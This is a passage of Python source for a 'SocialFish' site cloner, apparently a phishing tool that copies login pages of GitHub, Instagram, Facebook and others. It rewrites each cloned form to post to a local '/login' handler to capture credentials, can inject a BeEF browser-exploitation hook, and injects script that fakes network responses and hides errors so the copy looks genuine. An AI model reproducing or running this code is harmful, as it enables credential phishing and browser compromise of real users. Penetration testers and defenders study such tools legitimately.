            base_domain = urllib.parse.urlparse(base_url).netloc
            if parsed.netloc == base_domain:
                return True
            
            # Allow common social media domains and CDNs
            return any(pattern in parsed.netloc for pattern in allowed_patterns)
            
        except Exception:
            return False
    
    def _download_sync_universal_enhanced(self, url, output_dir, resource_type, base_url, referer=None):
        """ENHANCED: Universal synchronous download - works for any site"""
        try:
            import requests
            
            # Universal session setup
            session = requests.Session()
            session.verify = False
            session.timeout = 30
            
            # Enhanced headers based on URL and resource type
            headers = self._get_universal_headers(url, resource_type, base_url, referer)
            
            # Follow redirects properly
            response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                content = response.content
                
                # Enhanced content validation
                if not self._validate_content(content, resource_type, response.headers):
                    logger.warning(f"Invalid content type for {resource_type} from {url}")
                    return None
                
                # Universal decompression
                content = self._universal_decompress(content, response.headers)
                
                # Update stats
                self.resource_manager.stats['downloaded'] += 1
                self.resource_manager.stats['bytes_downloaded'] += len(content)
                
                # Universal save logic
                local_path = self._universal_save_enhanced(content, url, output_dir, resource_type, response.headers)
                
                if local_path:
                    logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
                    return local_path
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Universal download failed for {url}: {e}")
            self.resource_manager.stats['failed'] += 1
            return None
    
    def _get_universal_headers(self, url, resource_type, base_url, referer=None):
        """Get universal headers that work for any site"""
        # Detect target domain for customization
        parsed_base = urllib.parse.urlparse(base_url)
        target_domain = parsed_base.netloc
        
        # Universal base headers
        headers = {
            'User-Agent': self._get_universal_user_agent(target_domain),
            'Accept': self._get_universal_accept_header(resource_type, url),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': referer or base_url,
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # Add security headers for modern sites
        fetch_site = self._get_fetch_site_universal(url, base_url)
        headers.update({
            'Sec-Fetch-Dest': self._get_fetch_dest_universal(resource_type),
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': fetch_site,
        })
        
        # Platform-specific headers
        headers.update(self._get_platform_specific_headers(target_domain))
        
        return headers
    
    def _get_universal_user_agent(self, domain):
        """Get appropriate user agent for any domain"""
        # Use modern Chrome user agent for best compatibility
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    
    def _get_universal_accept_header(self, resource_type, url):
        """Get universal Accept header for any resource type"""
        # Enhanced accept headers for better compatibility
        if resource_type == 'svg' or '.svg' in url.lower():
            return 'image/svg+xml,image/*,*/*;q=0.8'
        elif resource_type == 'image':
            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
        elif resource_type == 'css':
            return 'text/css,*/*;q=0.1'
        elif resource_type == 'js':
            return 'application/javascript,text/javascript,*/*;q=0.01'
        elif resource_type == 'font':
            return 'font/woff2,font/woff,font/ttf,*/*;q=0.1'
        else:
            return '*/*'
    
    def _get_fetch_dest_universal(self, resource_type):
        """Get universal Sec-Fetch-Dest"""
        fetch_dest_map = {
            'image': 'image',
            'svg': 'image',
            'css': 'style',
            'js': 'script',
            'font': 'font',
        }
        return fetch_dest_map.get(resource_type, 'empty')
    
    def _get_fetch_site_universal(self, url, base_url):
        """Universal Sec-Fetch-Site determination"""
        try:
            url_domain = urllib.parse.urlparse(url).netloc
            base_domain = urllib.parse.urlparse(base_url).netloc
            
            if url_domain == base_domain:
                return 'same-origin'
            elif url_domain.endswith('.'.join(base_domain.split('.')[-2:])):
                return 'same-site'
            else:
                return 'cross-site'
        except:
            return 'cross-site'
    
    def _get_platform_specific_headers(self, domain):
        """Get platform-specific headers for better compatibility"""
        headers = {}
        
        # Social media platform specific headers
        social_platforms = ['facebook.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
        
        if any(platform in domain for platform in social_platforms):
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            })
        
        return headers
    
    def _validate_content(self, content, resource_type, headers):
        """Validate that downloaded content matches expected type"""
        if not content:
            return False
        
        content_type = headers.get('content-type', '').lower()
        
        # Check for HTML returned instead of expected content
        if resource_type in ['image', 'svg', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
            return False
        
        # Additional validation for specific types
        if resource_type == 'svg':
            # SVG should start with SVG tag or be valid XML
            if not (content.startswith(b'<svg') or content.startswith(b'<?xml')):
                return False
        
        return True
    
    def _universal_decompress(self, content, headers):
        """Universal decompression that works for any site"""
        if not content:
            return content
            
        encoding = headers.get('content-encoding', '').lower()
        
        try:
            if 'br' in encoding:
                return brotli.decompress(content)
            elif 'gzip' in encoding:
                return gzip.decompress(content)
            elif 'deflate' in encoding:
                return zlib.decompress(content)
        except Exception as e:
            logger.debug(f"Decompression failed, using raw content: {e}")
            # Magic byte detection fallback
            if content[:2] == b'\x1f\x8b':
                try:
                    return gzip.decompress(content)
                except:
                    pass
            elif content[0:1] == b'\x78':
                try:
                    return zlib.decompress(content)
                except:
                    pass
        
        return content
    
    def _universal_save_enhanced(self, content, url, output_dir, resource_type, headers):
        """Enhanced universal save logic with filename length protection"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Handle dynamic resource URLs (like Facebook's rsrc.php)
        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
            return self._save_dynamic_resource_safe(content, url, output_dir, resource_type, headers)
        
        # Check filename length for original path preservation
        if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
            original_path = parsed_url.path.lstrip('/')
            
            # CRITICAL FIX: Check total path length to prevent filesystem errors
            full_path = output_dir / original_path
            if len(str(full_path)) > 250:  # Safe limit for most filesystems
                logger.warning(f"Path too long, using hash-based naming: {len(str(full_path))} chars")
                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
            
            try:
                file_path = output_dir / original_path
                file_path.parent.mkdir(parents=True, exist_ok=True)
                local_path = original_path
            except OSError as e:
                logger.warning(f"Path creation failed: {e}, using hash-based naming")
                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        else:
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        
        # Universal binary save (works for all sites)
        try:
            with open(file_path, 'wb') as f:
                f.write(content)
            return local_path
        except OSError as e:
            logger.error(f"File save failed: {e}, trying hash-based naming")
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
    
    def _save_dynamic_resource_safe(self, content, url, output_dir, resource_type, headers):
        """Save dynamic resources with safe filename handling"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Extract filename from dynamic URL
        path_parts = parsed_url.path.split('/')
        original_filename = path_parts[-1] if path_parts else 'resource'
        
        # SAFE FILENAME: Limit length and sanitize
        if len(original_filename) > 100:  # Too long, use hash
            url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
            extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
            filename = f"dyn_{url_hash}{extension}"
        else:
            # Use original but ensure proper extension
            if '.' not in original_filename:
                extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
                filename = f"{original_filename}{extension}"
            else:
                filename = original_filename
        
        # Sanitize filename for filesystem safety
        filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
        
        # Save in appropriate subdirectory
        subdir = self._get_subdir_enhanced(resource_type)
        resource_dir = output_dir / subdir
        resource_dir.mkdir(exist_ok=True)
        file_path = resource_dir / filename
        local_path = f"{subdir}/{filename}"
        
        # Ensure path isn't too long
        if len(str(file_path)) > 250:
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
        
        # Save file
        try:
            with open(file_path, 'wb') as f:
                f.write(content)
            return local_path
        except OSError as e:
            logger.warning(f"Dynamic resource save failed: {e}, using hash fallback")
            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
    
    def _save_with_hash_name(self, content, url, output_dir, resource_type, headers):
        """Fallback save method using hash-based naming (always works)"""
        url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
        extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
        filename = f"res_{url_hash}{extension}"
        subdir = self._get_subdir_enhanced(resource_type)
        resource_dir = output_dir / subdir
        resource_dir.mkdir(exist_ok=True)
        file_path = resource_dir / filename
        local_path = f"{subdir}/{filename}"
        
        # This should always work as it's a short, safe filename
        with open(file_path, 'wb') as f:
            f.write(content)
        
        return local_path
    
    def _get_extension_enhanced(self, url: str, content_type: str, resource_type: str) -> str:
        """Enhanced extension detection"""
        # Try URL extension first
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.path:
                _, ext = os.path.splitext(parsed.path)
                if ext and len(ext) <= 5:
                    return ext
        except Exception:
            pass
        
        # Enhanced content type mapping
        extensions = {
            'text/css': '.css',
            'application/javascript': '.js',
            'text/javascript': '.js',
            'image/jpeg': '.jpg',
            'image/png': '.png',
            'image/gif': '.gif',
            'image/svg+xml': '.svg',
            'image/webp': '.webp',
            'image/avif': '.avif',
            'font/woff2': '.woff2',
            'font/woff': '.woff',
            'application/font-woff': '.woff',
            'application/font-woff2': '.woff2',
            'font/ttf': '.ttf',
            'font/otf': '.otf'
        }
        
        # Special handling for resource types
        if resource_type == 'svg':
            return '.svg'
        elif resource_type == 'image' and not content_type:
            return '.jpg'  # Default for images
        
        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
    
    def _get_subdir_enhanced(self, resource_type: str) -> str:
        """Enhanced subdirectory mapping"""
        subdirs = {
            'css': 'css',
            'js': 'js', 
            'image': 'images',
            'svg': 'images',  # SVGs go in images folder
            'font': 'fonts',
            'asset': 'assets'
        }
        return subdirs.get(resource_type, 'assets')
    
    def _create_placeholder_resources(self, output_dir: Path):
        """Create placeholder files for common missing resources to prevent 404s"""
        try:
            # Common missing files that cause 404s
            placeholder_files = [
                ('favicon.ico', 'assets', b''),  # Empty favicon
                ('fluidicon.png', 'images', b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xda\x63\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'),  # 1x1 PNG
                ('hsts-pixel.gif', 'images', b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;'),  # 1x1 GIF
                ('chunk-vendors.js', 'js', b'// Placeholder chunk file\nconsole.log("Chunk loaded");'),
                ('runtime.js', 'js', b'// Placeholder runtime\nwindow.__webpack_require__ = function(){};'),
                ('polyfill.js', 'js', b'// Placeholder polyfill\n'),
                ('main.js', 'js', b'// Placeholder main script\n'),
            ]
            
            for filename, subdir, content in placeholder_files:
                file_dir = output_dir / subdir
                file_dir.mkdir(exist_ok=True)
                file_path = file_dir / filename
                
                # Only create if doesn't exist
                if not file_path.exists():
                    with open(file_path, 'wb') as f:
                        f.write(content)
                    logger.debug(f"Created placeholder: {file_path}")
            
            # Create common subdirectories if they don't exist
            for subdir in ['security', 'cdn-cgi/challenge-platform/scripts/jsd', 'token']:
                (output_dir / subdir).mkdir(parents=True, exist_ok=True)
            
        except Exception as e:
            logger.debug(f"Placeholder creation failed: {e}")  # Non-critical, just log
    
    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
                           resource_type: str, output_dir: Path) -> Optional[str]:
        """Save resource with SIMPLE binary/text handling - no async file ops for binary"""
        try:
            url = metadata.get('url', '')
            content_type = metadata.get('content_type', '')
            extension = self._get_extension_enhanced(url, content_type, resource_type)
            parsed_url = urllib.parse.urlparse(url)
            
            # Validate content
            if not content:
                logger.warning(f"Empty content for {url}")
                return None
            
            # Determine save path - preserve structure for images
            if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
                original_path = parsed_url.path.lstrip('/')
                file_path = output_dir / original_path
                file_path.parent.mkdir(parents=True, exist_ok=True)
                local_path = original_path
            else:
                url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
                filename = f"resource_{url_hash}{extension}"
                subdir = self._get_subdir_enhanced(resource_type)
                resource_dir = output_dir / subdir
                resource_dir.mkdir(exist_ok=True)
                file_path = resource_dir / filename
                local_path = f"{subdir}/{filename}"
            
            # SIMPLE FIX: Use regular file operations like the working code
            is_text = self._is_text_content_type(content_type, resource_type)
            
            if is_text:
                # Text content - decode and save
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(text_content)
                except Exception as e:
                    logger.error(f"Text save failed for {url}: {e}")
                    return None
            else:
                # Binary content - EXACTLY like working code
                with open(file_path, 'wb') as f:
                    f.write(content)  # Direct binary write, no async
            
            # Verify file
            if not file_path.exists() or file_path.stat().st_size == 0:
                logger.error(f"File not written: {file_path}")
                return None
            
            logger.debug(f"Saved {resource_type}: {file_path} ({len(content)} bytes)")
            return local_path
            
        except Exception as e:
            logger.error(f"Save failed for {url}: {e}")
            return None
    
    def _process_forms_for_socialfish(self, soup: BeautifulSoup):
        """Process forms for SocialFish integration"""
        for form in soup.find_all('form'):
            # Store original action
            original_action = form.get('action', '')
            if original_action:
                form['data-original-action'] = original_action
            
            # Redirect to SocialFish login handler
            form['action'] = '/login'
            form['method'] = 'post'
    
    def _add_beef_hook(self, soup: BeautifulSoup):
        """Add BeEF hook for penetration testing"""
        script = soup.new_tag('script')
        script['src'] = 'http://localhost:3000/hook.js'
        
        body = soup.find('body')
        if body:
            body.append(script)
    
    def _add_universal_ajax_blocking(self, soup: BeautifulSoup):
        """Enhanced universal AJAX blocking to prevent 405 errors on any site"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // Enhanced Universal AJAX blocking to prevent 405 errors
            const blockedPatterns = [
                '/ajax/', '/api/', '/graphql', '/_api/', '/rpc/',
                '/webstorage', '/analytics', '/tracking', '/metrics',
                '/beacon', '/collect', '/report', '/log', '/bz?',
                '/process_keys', '/telemetry', '/events', '/ping'
            ];
            
            // Enhanced XMLHttpRequest blocking
            if (window.XMLHttpRequest) {
                const originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
                        console.log('🛡️ Blocked AJAX call to prevent 405 error:', url);
                        // Create a mock XHR that appears to work but doesn't make requests
                        this.readyState = 4;
                        this.status = 200;
                        this.responseText = '{}';
                        this.response = '{}';
                        setTimeout(() => {
                            if (typeof this.onreadystatechange === 'function') {
                                this.onreadystatechange();
                            }
                            if (typeof this.onload === 'function') {
                                this.onload();
                            }
                        }, 10);
                        return;
                    }
                    return originalOpen.call(this, method, url, async, user, password);
                };
                
                // Also block send to be extra safe
                const originalSend = XMLHttpRequest.prototype.send;
                XMLHttpRequest.prototype.send = function(data) {
                    if (this.readyState === 4) return; // Already blocked
                    return originalSend.call(this, data);
                };
            }
            
            // Enhanced fetch blocking with better error handling
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = function(url, options) {
                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
                        console.log('🛡️ Blocked fetch call to prevent 405 error:', url);
                        return Promise.resolve(new Response('{}', {
                            status: 200,
                            statusText: 'OK',
                            headers: new Headers({'Content-Type': 'application/json'})
                        }));
                    }
                    return originalFetch.apply(this, arguments).catch(err => {
                        console.log('🛡️ Fetch error caught and handled:', err);
                        return new Response('{}', {status: 200});
                    });
                };
            }
            
            // Block WebSocket connections that might cause issues
            if (window.WebSocket) {
                const originalWebSocket = window.WebSocket;
                window.WebSocket = function(url, protocols) {
                    console.log('🛡️ Blocked WebSocket connection:', url);
                    const mockSocket = {
                        close: function() {},
                        send: function() {},
                        addEventListener: function() {},
                        removeEventListener: function() {},
                        readyState: 3, // CLOSED
                        CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
                    };
                    // Trigger close event after a delay
                    setTimeout(() => {
                        if (typeof mockSocket.onclose === 'function') {
                            mockSocket.onclose();
                        }
                    }, 100);
                    return mockSocket;
                };
            }
            
            // Block Service Workers that might interfere
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register = function() {
                    console.log('🛡️ Blocked service worker registration');
                    return Promise.resolve({unregister: () => Promise.resolve()});
                };
            }
            
            // Silence console errors for blocked requests
            const originalError = console.error;
            console.error = function(...args) {
                const message = args[0];
                if (typeof message === 'string' && 
                    (message.includes('405') || message.includes('Failed to fetch') || 
                     message.includes('NetworkError') || message.includes('CORS'))) {
                    console.log('🛡️ Suppressed error:', message);
                    return;
                }
                return originalError.apply(this, args);
            };
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)
    
    def _add_socialfish_js(self, soup: BeautifulSoup):
        """Add SocialFish-specific JavaScript"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // SocialFish form override
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function(e) {
                        // Let SocialFish handle the form submission
                        this.action = '/login';
                        this.method = 'post';
                    });
                });
            });
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)

class SocialFishCloner:
    """Main cloner class for SocialFish integration"""
    
    def __init__(self, config: SocialFishConfig = None):
        self.config = config or SocialFishConfig()
        self.user_agent_manager = AdvancedUserAgentManager()
        self.resource_manager = SocialFishResourceManager(self.config)
        self.content_processor = SocialFishContentProcessor(self.config, self.resource_manager)
        self.browser_manager = SocialFishBrowserManager(self.config)
    
    async def clone_website_async(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
        """Async clone website for SocialFish"""
        start_time = time.time()
        
        try:
            logger.info(f"🚀 Starting SocialFish clone: {url}")
            
            # Setup output directory (SocialFish structure)
            output_dir = self._create_output_directory(url, user_agent)
            if not output_dir:
                return False
            
            # Get user agent data
            user_agent_data = self.user_agent_manager.get_agent_for_user_agent(user_agent)
            
            # Initialize components
            await self.resource_manager.initialize_sessions(user_agent_data)
            self.browser_manager.driver = self.browser_manager.initialize_browser(user_agent)
            
            # Get page content
            html_content = await self._get_page_content(url)
            if not html_content:
                logger.error("❌ Failed to retrieve page content")
                return False
            
            logger.info(f"✅ Retrieved content: {len(html_content)} characters")
            
            # Process content
            processed_html = await self.content_processor.process_html(
                html_content, url, output_dir, beef_enabled
            )
            
            # Save main HTML file
            index_path = output_dir / 'index.html'
            async with aiofiles.open(index_path, 'w', encoding='utf-8') as f:
                await f.write(processed_html)
            
            # Save metadata
            await self._save_metadata(url, output_dir, start_time)
            
            duration = time.time() - start_time
            logger.info(f"🎉 SocialFish clone completed in {duration:.2f}s")
            logger.info(f"📊 Stats: {self.resource_manager.stats}")
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Cloning failed: {e}")
            return False
        
        finally:
            await self._cleanup()
    
    def _create_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
        """Create output directory in SocialFish structure"""
        try:
            # Clean user agent for directory name
            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)
            
            # Extract domain from URL
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Create SocialFish directory structure
            output_dir = Path(self.config.output_base) / safe_agent / safe_domain
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
            for subdir in ['css', 'js', 'images', 'fonts', 'assets']:
                (output_dir / subdir).mkdir(exist_ok=True)
            
            logger.info(f"📁 Output directory: {output_dir}")
            return output_dir
            
        except Exception as e:
            logger.error(f"❌ Failed to create output directory: {e}")
            return None
    
    async def _get_page_content(self, url: str) -> Optional[str]:
        """Get page content using best available method - FIXED: No double decompression"""
        # Try browser rendering first
        if self.browser_manager.driver:
            content = await self.browser_manager.render_page(url)
            if content:
                return content
        
        # Fallback to HTTP request
        if self.resource_manager.session_pool:
            session = self.resource_manager.session_pool[0]
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        # CRITICAL FIX: aiohttp automatically decompresses
                        content = await response.read()
                        
                        # Decode text for HTML content only (no manual decompression needed)
                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1']:
                            try:
                                return content.decode(encoding)
                            except UnicodeDecodeError:
                                continue
                        
                        return content.decode('utf-8', errors='ignore')
            except Exception as e:
                logger.error(f"HTTP request failed: {e}")
        
        return None
    
    async def _save_metadata(self, url: str, output_dir: Path, start_time: float):
        """Save cloning metadata"""
        metadata = {
            'url': url,
            'timestamp': time.time(),
            'duration': time.time() - start_time,
            'stats': self.resource_manager.stats,
            'socialfish_version': '2.0_css_background_fixed'
        }
        
        async with aiofiles.open(output_dir / 'metadata.json', 'w') as f:
            await f.write(json.dumps(metadata, indent=2))
    
    async def _cleanup(self):
        """Cleanup resources"""
        await self.resource_manager.cleanup()
        self.browser_manager.cleanup()

# SocialFish Integration Functions
def sync_wrapper(coro):
    """Wrapper to run async function in sync context"""
    @wraps(coro)
    def wrapper(*args, **kwargs):
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        try:
            if loop.is_running():
                # If loop is already running, use thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(asyncio.run, coro(*args, **kwargs))
                    return future.result()
            else:
                return loop.run_until_complete(coro(*args, **kwargs))
        except Exception as e:
            logger.error(f"Sync wrapper error: {e}")
            return False
    
    return wrapper

# Main SocialFish compatible function
@sync_wrapper
async def clone_async(url: str, user_agent: str, beef: str) -> bool:
    """Async clone function for SocialFish"""
    beef_enabled = beef.lower() == 'yes'
    
    config = SocialFishConfig()
    cloner = SocialFishCloner(config)
    
    return await cloner.clone_website_async(url, user_agent, beef_enabled)

# SocialFish compatible clone function (synchronous interface)
def clone(url: str, user_agent: str, beef: str) -> bool:
    """
    SocialFish compatible clone function
    
    Args:
        url: Target URL to clone
        user_agent: User agent string from request
        beef: 'yes' or 'no' for BeEF hook injection
    
    Returns:
        bool: True if cloning successful, False otherwise
    """
    try:
        logger.info(f"🐟 SocialFish FINAL Enhanced Clone Request: {url}")
        logger.info(f"👤 User Agent: {user_agent[:50]}...")
        logger.info(f"🥩 BeEF Hook: {beef}")
        
        # Call async function with sync wrapper
        result = clone_async(url, user_agent, beef)
        
        if result:
            logger.info("✅ SocialFish FINAL clone completed successfully")
        else:
            logger.error("❌ SocialFish FINAL clone failed")
        
        return result
        
    except Exception as e:
        logger.error(f"❌ SocialFish FINAL clone error: {e}")
        return False

# Test function for universal usage
if __name__ == "__main__":
    test_sites = [
        ("https://github.com/login", "GitHub"),
        ("https://www.instagram.com/", "Instagram"),
        ("https://www.facebook.com/", "Facebook"),
        ("https://twitter.com/", "Twitter"),
        ("https://www.linkedin.com/", "LinkedIn")
    ]
    
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    print("🧪 Testing FINAL FIXED SocialFish cloner...")
    print("Select a site to test:")
    for i, (url, name) in enumerate(test_sites, 1):
        print(f"{i}. {name} ({url})")
    
    try:
        choice = int(input("Enter choice (1-5): ")) - 1
        if 0 <= choice < len(test_sites):
            test_url, site_name = test_sites[choice]
            print(f"🚀 Testing {site_name}...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print(f"🎉 {site_name} clone completed successfully!")
            else:
                print(f"❌ {site_name} clone failed!")
        else:
            # Default test
            test_url = test_sites[0][0]
            print(f"🚀 Running default test: {test_sites[0][1]}...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print("🎉 Test completed successfully!")
            else:
                print("❌ Test failed!")
    except (ValueError, KeyboardInterrupt):
        # Default test
        test_url = test_sites[0][0]
        print(f"🚀 Running default test: {test_sites[0][1]}...")
        result = clone(test_url, test_user_agent, "no")
        
        if result:
            print("🎉 Test completed successfully!")
        else:
            print("❌ Test failed!")